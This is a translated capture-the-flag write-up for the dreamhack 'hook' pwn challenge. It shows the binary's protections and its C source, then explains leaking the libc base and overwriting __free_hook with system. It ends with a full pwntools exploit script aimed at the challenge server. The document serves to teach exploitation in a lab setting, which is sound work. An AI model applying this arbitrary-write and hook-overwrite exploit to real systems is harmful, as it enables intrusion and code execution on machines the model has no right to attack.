# dreamhack.io: hook

> Originally published on [Naver Blog](https://blog.naver.com/chaeeunhur630/224311956970). Translated and reformatted in English.

Check the protection techniques and source code.

[*] '/Users/chaeeun/Desktop/6b8cd690-a995-4baa-a3a8-e89ec6005659/hook'
 Arch: amd64-64-little
 RELRO: Full RELRO
 Stack: Canary found
 NX: NX enabled
 PIE: No PIE (0x400000)
 Stripped: No
chaeeun@chaeeuns-MacBook-Air 6b8cd690-a995-4baa-a3a8-e89ec6005659 % cat hook.c
// gcc -o init_fini_array init_fini_array.c -Wl,-z,norelro
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
 puts("TIME OUT");
 exit(-1);
}

void initialize() {
 setvbuf(stdin, NULL, _IONBF, 0);
 setvbuf(stdout, NULL, _IONBF, 0);
 signal(SIGALRM, alarm_handler);
 alarm(60);
}

int main(int argc, char *argv[]) {
 long *ptr;
 size_t size;

 initialize();

 printf("stdout: %p\n", stdout);

 printf("Size: ");
 scanf("%ld", &size);

 ptr = malloc(size);

 printf("Data: ");
 read(0, ptr, size);

 *(long *)*ptr = *(ptr+1);

 free(ptr);
 free(ptr);

 system("/bin/sh");
 return 0;
}

Since Full Relro is applied, GOT overwrite is not possible. GOT overwrite is an attack technique that steals the execution flow by changing the function call address, and Full RELRO is a protection technique that prevents GOT overwrite by making the GOT read-only. NX and Carnary are also applied. Fortunately, PIE is not applied. When PIE is off, the code address of the binary is almost fixed. For example, addresses like main, win, puts@plt are the same every time.

So the core vulnerability is probably a pretty blatant arbitrary address write. In particular, since there is stdout output, it appears that it is there to accurately match the random writes to the libc address.

First of all, it seems correct to obtain the libc base using the stdout address given here.

*(long *)*ptr = *(ptr+1);

And here, write the desired value to the desired address.

In other words, input data usually has this structure.

ptr[0] = address to overwrite

ptr[1] = value to write

So, based on the old glibc standard, typical examples are:

ptr[0] = __free_hook

ptr[1] = system

You can make it by putting: __free_hook = system .

So, let’s start by finding the addresses.

stdout leak

→ libc base calculation

→ libc base + __free_hook offset = __free_hook real address

The runtime address is calculated as `libc base + system offset`.

The formula is leaked_stdout = libc_base + libc.symbols["_IO_2_1_stdout_"], so if you invert

You can say libc_base = leaked_stdout - libc.symbols["_IO_2_1_stdout_"].

So the respective addresses are:

libc_base = leaked_stdout - libc.symbols["_IO_2_1_stdout_"]

free_hook = libc_base + libc.symbols["__free_hook"]

It can be obtained as system = libc_base + libc.symbols["system"].

Then the code is

from pwn import *

context.arch = "amd64"

elf = ELF("./hook")
libc = ELF("./libc-2.23.so")

HOST = "host3.dreamhack.games"
PORT = 9431

p = remote(HOST, PORT)

# Get stdout leak
p.recvuntil(b"stdout: ")
leaked_stdout = int(p.recvline().strip(), 16)

# libc base calculation
libc_base = leaked_stdout - libc.symbols["_IO_2_1_stdout_"]
libc.address = libc_base

free_hook = libc.symbols["__free_hook"]
system = libc.symbols["system"]

log.info(f"leaked stdout = {hex(leaked_stdout)}")
log.info(f"libc base = {hex(libc_base)}")
log.info(f"__free_hook = {hex(free_hook)}")
log.info(f"system = {hex(system)}")

# *(long *)*ptr = *(ptr+1)
# In other words, write the value ptr[1] to the address ptr[0]
payload = p64(free_hook)
payload += p64(system)

p.sendlineafter(b"Size: ", str(len(payload)).encode())
p.sendafter(b"Data: ", payload)

p.interactive()

You can think of the data we entered in ptr as this.

ptr[0] = p64(__free_hook)

ptr[1] = p64(system)

Then the code runs:

*(long *)__free_hook = system;
